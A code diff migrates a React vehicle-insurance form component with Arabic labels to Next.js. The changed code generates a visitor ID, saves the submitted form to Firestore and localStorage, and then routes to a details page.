@@ -1,16 +1,20 @@
-import { useState } from "react";
-import { useNavigate } from "react-router-dom";
-import { motion } from "framer-motion";
-import { InsuranceFormData, FormErrors } from "../../types/insurance";
-import InsurancePurpose from "./InsurancePurpose";
-import VehicleRegistration from "./VehicleRegistration";
-import LoadingOverlay from "../LoadingOverlay";
-import { validateInsuranceForm } from "./validation";
-import { addData } from "../../apis/firebase";
+"use client"
+
+import type React from "react"
+
+import { useState } from "react"
+import { useRouter } from "next/navigation"
+import { motion } from "framer-motion"
+import InsurancePurpose from "./InsurancePurpose"
+import { addData } from "@/lib/firebase"
+import { FormErrors, InsuranceFormData } from "@/lib/types/insurance"
+import VehicleRegistration from "../Vaicle-reg"
+import LoadingOverlay from "../Loader"
+import { validateInsuranceForm } from "@/lib/validation"
 
 const InsuranceFormContainer: React.FC = () => {
-  const navigate = useNavigate();
-  const [isLoading, setIsLoading] = useState(false);
+  const router = useRouter()
+  const [isLoading, setIsLoading] = useState(false)
 
   const getInitialFormData = (): InsuranceFormData => {
     return {
@@ -25,53 +29,60 @@ const InsuranceFormContainer: React.FC = () => {
       serial_number: "",
       vehicle_manufacture_number: "",
       customs_code: "",
-    };
-  };
+    }
+  }
 
-  const [formData, setFormData] = useState<InsuranceFormData>(
-    getInitialFormData()
-  );
+  const [formData, setFormData] = useState<InsuranceFormData>(getInitialFormData())
 
-  const [errors, setErrors] = useState<FormErrors>({});
+  const [errors, setErrors] = useState<FormErrors>({})
 
   const handleSubmit = async (event: React.FormEvent) => {
-    event.preventDefault();
+    event.preventDefault()
 
-    const validationErrors = validateInsuranceForm(formData);
-    if (Object.keys(validationErrors).length > 0) {
-      setErrors(validationErrors);
-      window.scrollTo({ top: 0, behavior: "smooth" });
-      return;
+    const validationErrors = validateInsuranceForm(formData)
+    if (Object.keys(validationErrors as any).length > 0) {
+      setErrors(validationErrors as any)
+      window.scrollTo({ top: 0, behavior: "smooth" })
+      return
     }
 
-    setIsLoading(true);
+    setIsLoading(true)
     try {
-      await new Promise((resolve) => setTimeout(resolve, 1500));
-      const _id = localStorage.getItem("visitor");
-      addData({ id: _id, ...formData });
-      //localStorage.setItem("insuranceFormData", JSON.stringify(formData));
-      console.log("Form submitted:", formData);
-      navigate("/insurance-details");
-    } finally {
-      setIsLoading(false);
-    }
-  };
+      await new Promise((resolve) => setTimeout(resolve, 1500))
 
-  const setFormDataWithConstraints = (
-    updater:
-      | ((prev: InsuranceFormData) => InsuranceFormData)
-      | InsuranceFormData
-  ) => {
-    setFormData((prev) => {
-      const newData = typeof updater === "function" ? updater(prev) : updater;
-
-      if (newData.insurance_purpose === "property-transfer") {
-        newData.vehicle_type = "registration";
+      // Generate a visitor ID if it doesn't exist
+      let visitorId = localStorage.getItem("visitor")
+      if (!visitorId) {
+        visitorId = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15)
+        localStorage.setItem("visitor", visitorId)
       }
 
-      return newData;
-    });
-  };
+      // Add data to Firestore
+      await addData({ id: visitorId, ...formData })
+
+      // Store form data in localStorage
+      localStorage.setItem("insuranceFormData", JSON.stringify(formData))
+
+      console.log("Form submitted:", formData)
+      router.push("/insurance-details")
+    } finally {
+      setIsLoading(false)
+    }
+  }
+
+  const setFormDataWithConstraints = (
+    updater: ((prev: InsuranceFormData) => InsuranceFormData) | InsuranceFormData,
+  ) => {
+    setFormData((prev) => {
+      const newData = typeof updater === "function" ? updater(prev) : updater
+
+      if (newData.insurance_purpose === "property-transfer") {
+        newData.vehicle_type = "registration"
+      }
+
+      return newData
+    })
+  }
 
   return (
     <>
@@ -83,16 +94,9 @@ const InsuranceFormContainer: React.FC = () => {
         className="px-4 -mt-24 relative z-20"
       >
         <div className="container mx-auto">
-          <form
-            onSubmit={handleSubmit}
-            className="bg-white rounded-2xl p-6 md:p-10 shadow-2xl"
-          >
+          <form onSubmit={handleSubmit} className="bg-white rounded-2xl p-6 md:p-10 shadow-2xl">
             <div className="grid grid-cols-1 md:grid-cols-2 gap-6 md:gap-8">
-              <InsurancePurpose
-                formData={formData}
-                setFormData={setFormDataWithConstraints}
-                errors={errors}
-              />
+              <InsurancePurpose formData={formData} setFormData={setFormDataWithConstraints} errors={errors} />
               <VehicleRegistration
                 formData={formData}
                 setFormData={setFormDataWithConstraints}
@@ -115,9 +119,7 @@ const InsuranceFormContainer: React.FC = () => {
                     }
                     className="form-checkbox h-5 w-5 text-[#146394] rounded"
                   />
-                  <span className="text-[#146394] font-medium">
-                    أوافق على منح حق الاستعلام
-                  </span>
+                  <span className="text-[#146394] font-medium">أوافق على منح حق الاستعلام</span>
                 </label>
 
                 <motion.button
@@ -131,15 +133,13 @@ const InsuranceFormContainer: React.FC = () => {
                 </motion.button>
               </div>
               {errors.agreeToTerms && (
-                <p className="text-red-500 text-sm mt-2 text-center md:text-right">
-                  {errors.agreeToTerms}
-                </p>
+                <p className="text-red-500 text-sm mt-2 text-center md:text-right">{errors.agreeToTerms}</p>
               )}
             </div>
           </form>
         </div>
       </motion.div>
     </>
-  );
-};
-export default InsuranceFormContainer;
+  )
+}
+export default InsuranceFormContainer
